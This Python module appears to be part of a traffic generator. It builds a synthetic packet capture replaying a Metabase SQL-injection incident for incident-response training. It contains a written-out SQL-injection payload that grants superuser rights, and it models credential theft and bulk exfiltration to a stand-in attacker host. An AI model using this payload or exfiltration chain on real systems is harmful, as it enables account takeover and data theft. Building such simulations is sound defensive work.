"""netgen.metabase72898 -- the "Metabase CVE-2026-72898" incident-replay scenario.

A replay of the Metabase unauthenticated SQL-injection zero-day (CVE-2026-72898, CVSS 10.0;
CISA KEV, exploited in the wild): a remote, unauthenticated attacker injects SQL through the
``/reset_password`` endpoint and takes over the Metabase instance as administrator, then uses that
access to read the stored credentials for Metabase's CONNECTED databases and export data through
them. Not RCE -- the damage is credential theft and bulk data exfiltration from the backends.

Modelled as a selectable scenario (``ir-metabase-cve72898``, category IR), a SIBLING package to the
other IR replays. A NEW internet-published Metabase host (EXL-BI1) is injected at runtime, with its
existing backend EXL-SQL1 (TDS 1433) as the connected database. The chain: the origin-observable
SQL-injection POST, the admin-takeover API pulls that read the connected-DB config, then the
decisive pivot -- the Metabase server itself originating anomalous BULK TDS queries against its
backend and exporting the results to the attacker.

RFC 791 / network-observable: real IPv4 datagrams (RFC 1918 estate + RFC 5737 external actor). The
HTTPS legs carry a real key-logged TLS 1.3 handshake with the HTTP as cleartext in the record
(decrypts with the exported keys); the TDS to EXL-SQL1 is cleartext and fully decodable.

PIN-SAFE: every host is injected into ``ctx.h`` INSIDE ``build()``; a build that does not select
this scenario is byte-for-byte the baseline.
"""
from netgen import flows as F
from netgen.identity import H, get_current
from netgen import protocols as P
from netgen.core import Host

from netgen.netscaler import phases as NSP
from netgen.netscaler.phases import _https_open, _http_req, _https_msg
from netgen.netscaler import _host
from netgen.netscaler import content
import hashlib
import uuid

rng = NSP.rng

_BI_SUFFIX, _BI_IP = "BI1", "10.10.20.56"            # Metabase analytics server (published BI)
_BI_MAC = "00:50:56:bb:05:1a"
_EXTERNAL = {
    "attacker": ("scan72.bi-probe.example", "203.0.113.72", 11),   # offender / exfil destination
    # own benign-workforce identities (shared defect #28): a single-scenario capture used to
    # borrow netscaler-compromise's wfA-D from a cross-scenario cache that is only populated
    # when that OTHER scenario is also selected, so every "benign" portal visit here fell back
    # to the attacker's own address. Each sibling now injects its own four.
    "wfA": ("host-a.bi-probe.example", "198.51.100.51", 7),
    "wfB": ("host-b.bi-probe.example", "198.51.100.52", 7),
    "wfC": ("host-c.bi-probe.example", "198.51.100.53", 7),
    "wfD": ("host-d.bi-probe.example", "198.51.100.54", 7),
}
_UA = "python-httpx/0.27.0"
# the injection string carried in the /reset_password request (observable in the cleartext record)
_SQLI = ("{\"token\":\"0\",\"password\":\"x\",\"reset\":\"'); UPDATE core_user SET is_superuser=true "
         "WHERE email='attacker@bi-probe.example'-- -\"}")


def _inject_hosts(ctx):
    """Add the published Metabase host and the external attacker. Pin-safe: runs in the builder."""
    domain = P.DOMAIN
    bi_name = _host(ctx, _BI_SUFFIX)
    if bi_name not in ctx.h:
        ctx.h[bi_name] = Host(bi_name, ctx.link.place(_BI_IP), _BI_MAC, "https",
                              "Metabase analytics server (published BI)", ctx.link.server_net,
                              "metabase." + domain)
    cache = ctx.__dict__.setdefault("_mb_ext", {})
    for key, (fqdn, ip, hops) in _EXTERNAL.items():
        if key not in cache:
            h = Host(fqdn.split(".")[0].upper(), ip,
                     "02:00:5e:%02x:%02x:%02x" % (rng.randrange(256), rng.randrange(256), rng.randrange(256)),
                     "linux", "external", ip.rsplit(".", 1)[0] + ".0/24", fqdn)
            h.hops = hops
            cache[key] = h
    return cache


def mb_sqli(ctx, atk, mb, ts=None, confirm=False):
    """Stage 1 -- CVE-2026-72898: unauthenticated SQL injection POSTed to /reset_password. The
    injection string is cleartext in the TLS record. On the confirming second probe the server
    has already been made a superuser by the first request, so the reset response now carries a
    real UUID-shaped `metabase.SESSION` the admin API reads use next."""
    host = "%s:443" % mb.ip
    s = _https_open(ctx, atk, mb, ts, "openssl", sni=None, vantage=mb)
    req = _http_req("POST", "/api/session/reset_password", host, _UA,
                    extra=["Content-Type: application/json"], body=_SQLI.encode())
    if confirm:
        sid = str(uuid.UUID(bytes=hashlib.sha256(("mb-" + str(ts)).encode()).digest()[:16]))
        _https_msg(s, req, P.http_response("200 OK", ("{\"success\":true,\"session\":\"%s\"}" % sid).encode(),
                                           "application/json", s.t, server="Jetty",
                                           headers=["Set-Cookie: metabase.SESSION=%s; Path=/; HttpOnly" % sid]))
    else:
        sid = None
        _https_msg(s, req, P.http_response("200 OK", b"{\"success\":true}", "application/json", s.t, server="Jetty"))
    return F.merged(s._ns_pre, s.close(think=rng.uniform(0.05, 0.3))), sid


def mb_admin_pull(ctx, atk, mb, path, size, session, ts=None):
    """Stage 2 -- one admin-takeover API read on its own TLS session, carrying the real session
    id the confirming SQLi response set. Body is real JSON of the listed size."""
    host = "%s:443" % mb.ip
    s = _https_open(ctx, atk, mb, ts, "openssl", sni=None, vantage=mb)
    req = _http_req("GET", path, host, _UA, cookie="metabase.SESSION=%s" % session, accept_lang="en-US,en;q=0.9")
    _https_msg(s, req, P.http_response("200 OK", content.json_doc(size, path), "application/json", s.t, server="Jetty"))
    return F.merged(s._ns_pre, s.close(think=rng.uniform(0.05, 0.3)))


def mb_db_pool_open(ctx, mb, sql, ts=None):
    """One pooled TDS connection for the whole bulk pull (reused by `mb_db_exfil` for all three
    statements -- a real BI tool logs in once and runs several queries on the same session)."""
    out = ctx.arp_for(mb, sql, ts, vantage=mb)
    s = ctx.tcp(mb, sql, 1433, ts + 0.001, vantage=mb).handshake()
    s.c2s(P.tds_prelogin(True), think=0.0006)
    s.s2c(P.tds_prelogin(False), think=rng.uniform(0.0005, 0.003))
    s.c2s(P.tds_login7("metabase_app", app="Metabase", host=H("BI1"), db="Logistics"), think=0.001)
    s.s2c(P.tds_login_ack(db="Logistics"), think=rng.uniform(0.001, 0.005))
    return s, F.merged(out, s.drain())


def mb_db_exfil(ctx, s, query, cols, rows, ts=None):
    """One BULK query on the pooled connection -- a counted result set of hundreds to thousands of
    rows, split across several 4 KB TDS packets (``tds_split``), so the three statements total
    megabytes from EXL-SQL1."""
    s.at(ts)            # keep the statement at its scheduled offset (the page keys on it)
    s.c2s(P.tds_sql_batch(query), think=0.002)
    s.s2c(P.tds_split(0x04, P.tds_result(cols, rows), s.dport), think=rng.uniform(0.02, 0.2))
    return s.drain()    # emit now, not at close: late packets would be clamped to the writer clock


def mb_dns_lookup(ctx, mb, dns, atk, ts=None):
    """Resolved A lookup of the export sink's name by the Metabase server, before the PUT."""
    sport = mb.eph()
    txid = rng.randint(1, 0xFFFF)
    q = ctx.udp(mb, dns, sport, 53, P.dns_query(txid, atk.fqdn, P.DNS_A), ts, vantage=mb)
    a = ctx.udp(dns, mb, 53, sport, P.dns_response(txid, atk.fqdn, P.DNS_A, [(P.DNS_A, atk.ipb)],
                                                   aa=False, ttl=300), ts + rng.uniform(0.002, 0.02), vantage=mb)
    return F.merged([q], [a])


def build(ctx, eng, tag, win):
    """Schedule the CVE-2026-72898 incident: SQLi -> admin takeover -> connected-DB credential
    theft -> bulk TDS exfil from EXL-SQL1 -> export to the attacker. Signature-critical records
    always emitted; benign BI volume scales with ctx.scale. Registered as ``ir-metabase-cve72898``
    (incidents imports it lazily)."""
    ext = _inject_hosts(ctx)
    from netgen import incidents as INC
    s = INC.sched_factory(eng, ctx, tag, win)
    lo, hi = win
    scale = max(0.01, min(1.0, getattr(ctx, "scale", 1.0)))

    def at(offset):
        return lo + offset

    mb = ctx.h[_host(ctx, _BI_SUFFIX)]
    sql1 = ctx.h.get(_host(ctx, "SQL1"))
    atk = ext["attacker"]

    # ---- Stage 1: unauthenticated SQL injection -> admin takeover --------------------------
    s(at(18), lambda ctx2, atk2, mb2, ts=None: mb_sqli(ctx2, atk2, mb2, ts)[0], atk, mb)
    session_box = {}

    def _confirm(ctx2, atk2, mb2, ts=None):
        pk, sid = mb_sqli(ctx2, atk2, mb2, ts, confirm=True)
        session_box["sid"] = sid
        return pk
    s(at(46), _confirm, atk, mb)                                  # a second probe/confirm, issues the session

    # ---- Stage 2: admin API reads the connected-DB config + stored credentials -------------
    s(at(70), lambda ctx2, atk2, mb2, ts=None: mb_admin_pull(ctx2, atk2, mb2, "/api/database?include=tables", 4820, session_box["sid"], ts), atk, mb)
    s(at(96), lambda ctx2, atk2, mb2, ts=None: mb_admin_pull(ctx2, atk2, mb2, "/api/setting", 9130, session_box["sid"], ts), atk, mb)
    s(at(120), lambda ctx2, atk2, mb2, ts=None: mb_admin_pull(ctx2, atk2, mb2, "/api/database/2", 1640, session_box["sid"], ts), atk, mb)

    # ---- Stage 3: bulk TDS exfil from the connected backend EXL-SQL1, one pooled connection ----
    export_rows = []
    if sql1 is not None:
        pool_box = {}

        def _open(ctx2, mb2, sql2, ts=None):
            sess, pk = mb_db_pool_open(ctx2, mb2, sql2, ts)
            pool_box["s"] = sess
            return pk
        s(at(148), _open, mb, sql1)

        _EXFIL = [
            ("SELECT name FROM sys.databases", [("name", "nvarchar")],
             [("master",), ("tempdb",), ("model",), ("msdb",), ("Logistics",)]),
            ("SELECT TOP 5000 ShipmentId, TrackingNo, Status, Pallets FROM Logistics.dbo.Shipments",
             [("ShipmentId", "int"), ("TrackingNo", "nvarchar"), ("Status", "nvarchar"), ("Pallets", "int")],
             [(i, get_current().prefix + "%06d" % i, rng.choice(["IN_TRANSIT", "AT_HUB", "DELIVERED"]), rng.randint(1, 26)) for i in range(1, 5001)]),
            ("SELECT TOP 5000 CarrierId, Name FROM Logistics.dbo.Carriers", [("CarrierId", "int"), ("Name", "nvarchar")],
             [(i, "Carrier-%04d" % i) for i in range(1, 5001)]),
        ]
        export_rows = _EXFIL[1][2] + _EXFIL[2][2]
        for i, (q, cols, rows) in enumerate(_EXFIL):
            s(at(150 + i * 40), lambda ctx2, mb2, sql2, ts=None, q=q, cols=cols, rows=rows: mb_db_exfil(ctx2, pool_box["s"], q, cols, rows, ts), mb, sql1)

        def _close(ctx2, mb2, sql2, ts=None):
            pool_box["s"].at(ts)
            return pool_box["s"].close(by_client=True, think=rng.uniform(0.05, 0.3))
        s(at(150 + len(_EXFIL) * 40 + 5), _close, mb, sql1)

    # ---- Stage 4: export the pulled dataset back to the attacker (cleartext HTTP PUT) -------
    body = ("metabase bulk export\n" + "\n".join(
        "shipment=%s status=%s" % (r[1], r[2]) if len(r) == 4 else "carrier=%s" % r[1] for r in export_rows[:2000])).encode()
    dc1 = ctx.h.get(_host(ctx, "DC1"))
    if dc1 is not None:
        s(at(316), mb_dns_lookup, mb, dc1, atk)
    s(at(320), NSP.config_exfil, mb, atk, body, path="/staging/export_dump.csv")

    # ---- benign interleave: normal BI dashboard traffic to Metabase ------------------------
    for label in ("A", "B", "C", "D"):
        visits = max(2, int(round(10 * scale)))
        for _ in range(visits):
            client = ext[{"A": "wfA", "B": "wfB", "C": "wfC", "D": "wfD"}[label]]
            s(lo + rng.uniform(0, max(1.0, hi - lo - 60)), NSP.portal_browse, client, mb, label, product="metabase")
